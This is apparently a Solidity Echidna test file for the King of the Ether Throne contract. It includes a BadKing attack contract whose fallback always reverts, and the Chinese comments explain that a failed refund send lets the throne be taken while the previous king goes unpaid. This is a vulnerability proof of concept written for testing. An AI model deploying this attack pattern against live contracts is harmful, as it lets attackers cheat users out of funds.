pragma solidity ^0.4.0;
import "./king_source.sol";

contract BadKing {
    // 恶意合约：拒绝接收补偿款，试图通过 send 失败导致逻辑异常
    function() public payable { revert(); }
    
    function claim(address throne) public payable {
        throne.call.value(msg.value)();
    }
}

contract TestKing is KingOfTheEtherThrone {
    BadKing public badKing;
    bool public successAfterAttack = false;

    constructor() public payable {
        badKing = new BadKing();
    }

    function attack() public payable {
        // 1. 让恶意合约抢占王位
        badKing.claim.value(100 finney)(address(this));
        
        // 2. 尝试用新账户（当前测试合约）抢回王位
        // 正常逻辑：给前任退款失败应该导致整个交易回滚
        // 漏洞逻辑：send 失败但代码继续，导致前任拿不到钱但位子被顶了
        this.claimThrone("NewKing");
        successAfterAttack = true;
    }

    function echidna_test_king_vulnerable() public view returns (bool) {
        return successAfterAttack == false;
    }
}
